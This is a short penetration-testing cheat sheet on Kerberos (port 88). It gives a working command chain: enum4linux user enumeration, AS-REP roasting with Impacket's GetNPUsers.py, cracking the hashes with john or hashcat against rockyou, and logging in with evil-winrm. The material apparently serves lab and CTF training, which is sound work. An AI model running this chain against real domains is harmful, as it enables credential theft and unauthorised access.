# Kerberos (Port #88)
Kerberos is a network authentication protocol used to provide secure authentication in client-server applications. It uses tickets to authenticate users, and these tickets are issued by a Kerberos authentication server (AS) after the user logs in. The ticket-granting ticket (TGT) is a special ticket that is issued by the AS after the user successfully authenticates. The TGT is then used by the user to obtain service tickets for specific services.

---
## Enumerate User Information
```
▶ enum4linux {TARGET_IP}
```
A bunch of usernames will be returned but no passwords. If Kerberos pre-authentication is disabled on any of the returned accounts, the impacket script `GetNPUsers.py` can be used to send a dummy request for authentication. The Key Distribution Center (KDC) will then return a TGT that is encrypted with the user’s password. From there, we can take the encrypted TGT, run it through a password cracker and brute force the user’s password.

---
## Obtain Encrypted User Password
```
▶ GetNPUsers.py {TARGET_DOMAIN} -usersfile domain_users.txt -outputfile users_password_hashes.txt -dc-ip {TARGET_DOMAIN_CONTROLLER_IP}
```

It is assumed the Impacket script `GetNPUsers.py` requires a username as a parameter and therefore the script is usually ran on all the usernames that were found. However, it turns out that the script can be used to output both the vulnerable usernames and their corresponding encrypted TGTs.
```
▶ GetNPUsers.py {TARGET_DOMAIN} -outputfile users_password_hashes.txt -dc-ip {TARGET_DOMAIN_CONTROLLER_IP} -request
```

### Crack Hash to Obtain Clear Text Password
```
▶ john --wordlist=/usr/share/wordlists/rockyou.txt users_password_hashes.txt
```
OR
```
▶ hashcat -m 18200 users_password_hashes.txt rockyou.txt --force
```

---
## Login to Target with Username & Password
```
▶ evil-winrm -i {TARGET_IP} -u {USERNAME} -p {PASSWORD}
```
